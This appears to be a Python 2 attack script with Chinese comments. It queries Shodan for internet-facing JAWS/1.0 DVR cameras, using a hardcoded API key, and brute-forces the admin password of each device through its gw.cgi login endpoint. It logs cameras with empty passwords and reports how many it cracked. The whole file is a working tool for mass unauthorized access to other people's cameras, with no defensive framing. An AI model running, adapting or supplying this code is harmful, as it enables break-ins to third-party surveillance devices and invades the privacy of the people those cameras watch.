#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib
import urllib2
import time
import shodan
i=0
api=shodan.Shodan("cB9sXwb7l95ZhSJaNgcaO7NQpkzfhQVM") 
def FindTarget():
    try:
        f=open("target.txt","w")
        results=api.search('JAWS/1.0') 
        print("Results found:%s"%results['total'])
        for result in results['matches']:
            url=result['ip_str']+":"+str(result['port'])
            f.write(url)
            f.write("\n")
        f.close()
    except shodan.APIError,e:
        print("Error:%s"%e)
def Login(host,port):
    global i
    try:
        with open("passwd.txt","r") as f:
            for line in f.readlines():
                passwd=line.strip("\n").strip("\r")
                headers={
                         'Host':host,
                         'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                         'Referer':"http://"+host+"/",
                         'Accept':"*/*",
                         'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                         'X-Requested-With':'XMLHttpRequest',
                         'Cookie':'lxc_save=admin%2c'+passwd+";dvr_camcnt=16;dvr_clientport="+port+";dvr_sensorcnt=4; dvr_usr=admin; dvr_pwd="+passwd+"; iSetAble=1; iPlayBack=1",
                         'Connection':'close'
                         }
                a='<juan ver=\"\" squ=\"\" dir=\"0\"><rpermission usr=\"admin\" pwd=\"'+passwd+'\"><config base=\"\"/><playback base=\"\"/></rpermission></juan>'
                b=urllib.quote(a)  #对a进行URL编码
                ti=int(time.time())    #获取当前距离元点的时间，整数
                data="xml="+b+"&_="+str(ti)
                url="http://"+host+"/cgi-bin/gw.cgi?"+data   #提交的url
                req=urllib2.Request(url=url,headers=headers) #得到一个urblib2.Request对象
                try:
                    response=urllib2.urlopen(req,timeout=5)
                    length=response.headers['Content-Length']
                    if length==str("175"):
                        i=i+1
                        if passwd=="":
                            print(host+"是空密码")
                            files=open("ip.txt","a")
			    data=host+passwd
                            files.write(data)
                            files.write("\n")
                            files.close()
                            break
                        else:
                            print(host+"--"+passwd+"--")
                            break
                except urllib2.URLError,e:
                    print("该网站"+host+"对输入密码错误三次进行了锁定！")
                    break
    except Exception , e:
        print("请求超时！")
def exploit():
    try:
        with open("target.txt") as f:
            for line in f.readlines():
                host=line.strip("\n").strip("\r")
                port=host.split(":")[1].strip("\r")
                Login(host,port)
    except Exception ,e:
        print("出现异常：%s",e)
    finally:
        print("共破解"+str(i)+"个摄像头")
def main():
    FindTarget()
    exploit()
if __name__=="__main__":
    start=time.time()
    main()
    end=time.time()
    print("共花费了%s的时间"%(end-start))

